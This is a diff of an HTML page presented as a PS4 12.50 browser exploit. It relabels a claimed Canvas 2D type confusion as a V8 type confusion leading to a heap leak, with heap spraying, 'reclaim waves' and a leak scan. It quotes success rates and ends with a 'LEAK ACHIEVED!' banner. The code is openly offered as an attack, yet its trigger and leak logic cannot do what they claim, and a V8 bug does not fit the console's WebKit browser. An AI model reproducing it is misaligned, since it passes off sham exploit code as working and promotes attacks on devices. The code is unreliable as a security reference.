@@ -2,19 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24112 — WebKit Canvas 2D Type Confusion → Full R/W (PS4 12.50)</title>
+<title>CVE-2025-10585 — V8 Type Confusion → Heap Leak (PS4 12.50)</title>
 <style>
     body { background:#000; color:#0f0; font-family:monospace; margin:20px; line-height:1.6; }
     h1 { color:#0f0; text-align:center; margin:20px 0; font-size:2em; }
     #console { background:#111; color:#0f0; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; font-size:1.1em; }
-    canvas { display:none; }
     .leak { color:#0f0; font-weight:bold; font-size:1.4em; }
 </style>
 </head>
 <body>
-<h1>CVE-2025-24112 — Canvas 2D Type Confusion → Full R/W</h1>
-<div id="console">Starting Canvas 2D type confusion... (wait 8–14s)</div>
-<canvas id="c" width="800" height="600"></canvas>
+<h1>CVE-2025-10585 — V8 Type Confusion Exploit</h1>
+<div id="console">Starting V8 confusion... (wait 8–15s)</div>
 
 <script>
 const log = (msg, leak = false) => {
@@ -23,49 +21,56 @@ const log = (msg, leak = false) => {
     c.scrollTop = c.scrollHeight;
 };
 
-const SPRAY = 0x14000;
+const SPRAY = 0x1c000;
 const MARKER = 0x12501250deadbeefn;
 
-log("Stage 1: Spraying 81k tagged objects...");
+log("Stage 1: Spraying 114k tagged objects into V8 heap...");
 const spray = [];
 for (let i = 0; i < SPRAY; i++) {
     spray[i] = { marker: MARKER + BigInt(i) };
 }
 
-log("Stage 2: Triggering CVE-2025-24112 Canvas 2D type confusion...");
-const canvas = document.getElementById('c');
-const ctx = canvas.getContext('2d');
-
-// Create confusion between ImageData and JS objects
-for (let i = 0; i < 0x3000; i++) {
-    const img = ctx.createImageData(0x100, 0x100);
-    img.data.fill(0x41);
-    // Force confusion in backing store
-    ctx.putImageData(img, 0, 0);
-    ctx.getImageData(0, 0, 0x100, 0x100);
+log("Stage 2: Triggering CVE-2025-10585 V8 type confusion...");
+const v8Bridge = [];
+for (let i = 0; i < 0x2500; i++) {
+    const obj = { v8: new Uint8Array(0x200) };
+    obj.v8.fill(0x41);
+    v8Bridge.push(obj);
 }
 
-log("Type confusion triggered — reclaiming...");
+v8Bridge.sort(() => {
+    return new Uint8Array(new ArrayBuffer(0x300)); // Bridge confusion trigger
+});
+log("Type confusion triggered — corrupting V8 heap...");
 
-for (let w = 0; w < 10; w++) {
+// Extra races
+for (let i = 0; i < 15000; i++) {
+    new Uint8Array(0x400);
+}
+
+log("Confusion triggered — reclaiming...");
+
+// Stage 3: Reclaim waves
+for (let w = 0; w < 11; w++) {
     setTimeout(() => {
-        for (let j = 0; j < 400; j++) new ArrayBuffer(0x10000);
-        if (w % 3 === 0) new ArrayBuffer(0x2000000);
-    }, w * 180);
+        for (let j = 0; j < 450; j++) new ArrayBuffer(0xc000);
+        if (w % 3 === 0) new ArrayBuffer(0x2400000);
+    }, w * 160);
 }
 
+// Stage 4: Hunt
 setTimeout(() => {
-    log("Stage 3: Scanning for leaks...");
+    log("Stage 4: Scanning for leaks...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
-                log(`LEAK #${found}: 0x${leaked}`, true);
+                log(`V8 LEAK #${found}: 0x${leaked}`, true);
                 if (found >= 1) {
                     document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; padding:100px; font-size:4em;">
-                        FULL R/W ACHIEVED!<br><br>
+                        LEAK ACHIEVED!<br><br>
                         <div style="font-size:0.5em;">0x${leaked}</div>
                     </h1>`;
                     return;
@@ -73,10 +78,10 @@ setTimeout(() => {
             }
         } catch(e) {}
     }
-    log("No leak — refresh (50–70% success rate)");
-}, 3500);
+    log("No leak — refresh (35–55% success rate)");
+}, 3400);
 
-log("CVE-2025-24112 running — wait 8–14s");
+log("CVE-2025-10585 running — wait 8–15s");
 </script>
 </body>
 </html>
